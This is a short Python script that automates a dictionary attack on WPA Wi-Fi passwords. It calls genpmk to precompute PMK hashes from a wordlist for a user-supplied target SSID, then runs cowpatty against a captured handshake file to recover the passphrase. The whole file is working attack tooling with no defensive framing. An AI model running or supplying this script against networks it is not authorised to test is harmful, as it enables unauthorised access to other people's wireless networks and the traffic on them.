import subprocess

def generate_pmk(wordlist_filename, hash_filename, ssid):
    genpmk_command = ['genpmk', '-f', wordlist_filename, '-d', hash_filename, '-s', ssid]

    print("Generating PMK hash using genpmk...")
    try:
        subprocess.run(genpmk_command, check=True)
        print("PMK hash generation completed.")
    except subprocess.CalledProcessError:
        print("PMK hash generation failed.")
        return False

    return True

def decrypt_handshake(hash_filename, handshake_filename, ssid):
    cowpatty_command = ['cowpatty', '-d', hash_filename, '-r', handshake_filename, '-s', ssid]

    print("Running cowpatty to decrypt the captured file...")
    try:
        subprocess.run(cowpatty_command, check=True)
        print("Decryption completed.")
    except subprocess.CalledProcessError:
        print("Decryption failed.")

def main():
    wordlist_filename = input("Enter the path to the wordlist file: ")
    hash_filename = input("Enter the path for saving the PMK hash file: ")
    ssid = input("Enter the target SSID (network name): ")
    handshake_filename = input("Enter the path to the handshake capture file: ")

    if generate_pmk(wordlist_filename, hash_filename, ssid):
        decrypt_handshake(hash_filename, handshake_filename, ssid)

if __name__ == '__main__':
    main()
